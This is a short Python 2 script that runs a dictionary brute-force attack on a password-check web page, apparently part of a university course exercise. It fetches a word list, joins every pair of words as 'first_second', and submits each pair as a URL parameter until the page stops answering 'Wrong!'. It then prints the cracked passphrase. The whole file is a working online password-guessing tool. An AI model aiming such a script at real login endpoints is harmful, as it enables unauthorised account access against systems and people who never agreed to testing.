import urllib, time

#Password dictionary URL
#http://cgi.soic.indiana.edu/~johfdunc/word_list.txt

#Password Check URL
#http://cgi.soic.indiana.edu/~johfdunc/password.cgi?groupname=Group+1&pw=%s

#Tried passphrases
failed = []

#Passphrase found flag
cracked = False

#Passphrase
passphrase = ""

#List of words
con = urllib.urlopen("http://cgi.soic.indiana.edu/~johfdunc/word_list.txt")
words = con.read().split()
con.close()
count = 0
start = time.time()
for first in words:
    count += 1
    for second in words:
        url = "http://cgi.soic.indiana.edu/~johfdunc/" + \
              "password.cgi?groupname=Group+1&pw="

        passphrase = first + "_" + second
        url += passphrase
        print passphrase

        try:
            con = urllib.urlopen(url)
        except IOError:
            print "IOError..."
        else:
            webpage = con.read()
            con.close()

            if "Wrong!" not in webpage:
                page = webpage
                cracked = True
                break
            else:
                failed.append(passphrase)
                continue
    if cracked:
        page = webpage
        break
print "I WIN!".center(30).replace(' ', '-')
print "The passphrase is " + passphrase
print "It took " + str(count) + "loops, and " + str(time.time() - start) + "seconds."

            
